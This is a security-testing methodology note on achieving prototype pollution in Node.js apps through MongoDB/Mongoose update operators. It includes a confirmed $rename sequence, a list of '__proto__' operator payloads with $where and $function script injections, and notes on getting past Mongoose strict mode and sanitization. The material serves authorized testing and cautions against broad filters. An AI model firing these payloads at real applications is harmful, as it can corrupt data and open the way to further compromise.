# Mongoose / document-store operators as pollution primitives

When the persistence layer takes operator-shaped input — `$rename`,
`$set`, `$unset`, `$push`, `update`, `findOneAndUpdate` — the target
PATH of the operator is a pollution primitive. A field path that
reaches `__proto__` writes onto `Object.prototype` when the document
is loaded and cloned into JS objects.

---

## 1. The $rename primitive (SecNotes — confirmed)

Mongo's `$rename` writes the value of one field to another field path.
The target is a dotted path — `__proto__.marker` is a legal target:

```json
{"filter": {"id": "<your-own-doc>"},
 "$rename": {"someExistingField": "__proto__.marker"}}
```

The sequence:

1. Create a doc with a field holding the value you want on the
   prototype (the source of the rename must exist).
2. Send the update with ONLY the filter + the `$rename` — no content
   fields (an update with content fields can write broadly; an
   update with only `$rename` is read-safe for other docs).
3. The store renames `someExistingField` → `__proto__.marker`.
4. On the next load/clone, the doc's `__proto__` path resolves —
   `marker` lands on `Object.prototype`.

Falsifier: the driver rejects the operator shape or coerces the
target to a literal field name `__proto__.marker` (a field named
literally that, not the prototype). The readback decides.

**Blast radius** (the card's own note): a broad filter with content
fields overwrites every document — pin the filter to your own id and
send no other fields.

## 2. The operator corpus

```json
{"$set": {"__proto__.m": 1}}
{"$rename": {"f": "__proto__.m"}}
{"$unset": {"__proto__.m": 1}}
{"$push": {"__proto__.arr": 1}}
{"$pull": {"__proto__.arr": 1}}
{"$addToSet": {"__proto__.arr": 1}}
{"$inc": {"__proto__.n": 1}}
{"$mul": {"__proto__.n": 2}}
{"$min": {"__proto__.n": 1}}
{"$max": {"__proto__.n": 1}}
{"$currentDate": {"__proto__.d": true}}
{"$setOnInsert": {"__proto__.m": 1}}
{"$merge": {"__proto__": {"m": 1}}}
{"$replaceRoot": {"newRoot": {"__proto__": {"m": 1}}}}
{"$project": {"m": "$__proto__.m"}}
{"$addFields": {"__proto__.m": 1}}
{"$lookup": {"from":"x","as":"__proto__.m"}}
{"$out": "__proto__.m"}
{"$where": "this.__proto__.m = 1"}
{"$function": {"body": "function(){return 1}", "args": [], "lang":"js"}}
{"$accumulator": {"init": "function(){return {}}", "accumulate": "function(){}"}}
{"update": {"__proto__": {"m": 1}}}
{"filter": {"__proto__": {"m": 1}}}
{"update": {"$set": {"__proto__.m": 1}}}
{"findOneAndUpdate": [{...}, {"$set": {"__proto__.m": 1}}]}
```

Each dotted target is the write path; the write lands where the path
resolves — `__proto__` as a segment resolves to the prototype when the
document materializes as a plain JS object.

## 3. The materialization step

The store holds a BSON `{"__proto__.m": 1}` or a nested
`{"__proto__":{"m":1}}`. Pollution only exists once the document is
materialized into a JS object — `doc.toObject()`, `doc.toJSON()`,
`lean()`, JSON.stringify + re-parse, or a merge of the doc into an
options object. Some paths keep the field a literal
`"__proto__.m"` string and never set the prototype.

The probe must end with a SECOND fetch — the same doc or a fresh one
— that materializes the object again. A successful `200` on the
update means nothing until the readback shows the marker.

## 4. The `findOneAndUpdate` API shapes

```json
{"filter": {...}, "update": {"$rename": {...}}}
{"filter": {...}, "update": {"$set": {"a.b.c": 1}}}
{"filter": {...}, "update": [{"$set": {...}}]}   — pipeline form
{"id": "...", "fields": {"a.b": 1}}
{"query": {...}, "doc": {...}}
{"where": {...}, "patch": {...}}
{"ops": [{"filter":{...},"update":{...}}]}       — bulk
{"bulk": [{"updateOne": {"filter":{}, "update":{"$set":{...}}}}]}
```

The app's own API shape decides which wrapper carries the operator —
match the observed field names (`filter`, `query`, `where`, `id`,
`update`, `patch`, `doc`, `fields`, `ops`).

## 5. Mongoose specifics

- **`strict`/`strictQuery`**: strict mode drops unknown schema paths
  — `__proto__.m` is unknown, so the write is dropped silently. Try
  the operator on a schema-known path first to confirm the update
  pipeline runs.
- **`sanitizeFilter`/`sanitizeProjection`**: mongoose's built-in
  filters strip `$` keys from filters but not always from update
  documents.
- **`toObject`/`toJSON` getters/virtuals**: the materialization step
  where `__proto__` fields go live.
- **`lean()`**: returns plain objects — the most common path where a
  stored `__proto__.` field becomes a real prototype write.
- **`Object.assign(doc, req.body)` / `doc.set(req.body)`**: the
  per-key sink — `doc.set('__proto__.m', 1)` vs
  `doc.set({__proto__:{m:1}})` differ; `set` on a dotted path treats
  segments literally.

## 6. Other document stores

- **NeDB/lowdb/jsondb**: JSON-file stores loaded into JS — the
  `__proto__` key in a stored doc becomes a prototype write on
  `JSON.parse` only if the store merges docs; on plain parse it is a
  literal key. Check the load path.
- **Redis-as-docstore**: `hset obj field value` — the `field` is a
  string; pollution happens only when the app later does
  `Object.assign({}, hgetall)` with `__proto__`-named fields.
- **Elasticsearch `_source` merge**: an update script
  (`ctx._source.x = ...`) is a script — `ctx._source["__proto__"].m=1`
  is a different primitive entirely (script injection, not PP).
- **SQL JSON columns**: `JSON_SET(col, '$."__proto__.m"', 1)` — the
  JSON path is quoted; the pollution only lands if the app merges the
  JSON field into objects.

## 7. The probe discipline

1. Pin the filter: `{"id": "<your-own>"}` — never a broad filter.
2. Omit content fields — only `filter` + the operator.
3. Create the source field first if the operator is `$rename` (the
   value has to exist to be renamed).
4. After the update, GET the doc AND a fresh object — the marker must
   appear on something you did not write.
5. Record the update's raw response — a `{"nModified":1}` vs
   `{"nModified":0}` vs `{"ok":1}` tells you whether the store
   accepted the operator shape at all.
